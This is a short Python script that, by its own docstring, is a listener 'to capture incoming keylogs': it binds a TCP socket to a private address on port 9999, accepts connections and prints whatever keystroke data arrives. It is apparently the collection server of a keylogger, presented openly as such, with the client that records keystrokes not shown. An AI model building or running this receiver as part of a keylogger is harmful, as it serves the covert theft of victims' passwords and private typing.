import socket

def start_listener(host='192.168.26.129', port=9999):
    """ Start the listener to capture incoming keylogs """
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))
        server_socket.listen(5)
        print(f"[*] Listening on {host}:{port}...")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"[*] Connection established from {client_address}")
            
            while True:
                data = client_socket.recv(1024)  # Buffer size of 1024 bytes
                if not data:
                    break
                print(f"Received: {data.decode('utf-8')}")
            
            client_socket.close()
            print("[*] Connection closed.")

    except KeyboardInterrupt:
        print("\n[!] Listener stopped.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    start_listener()
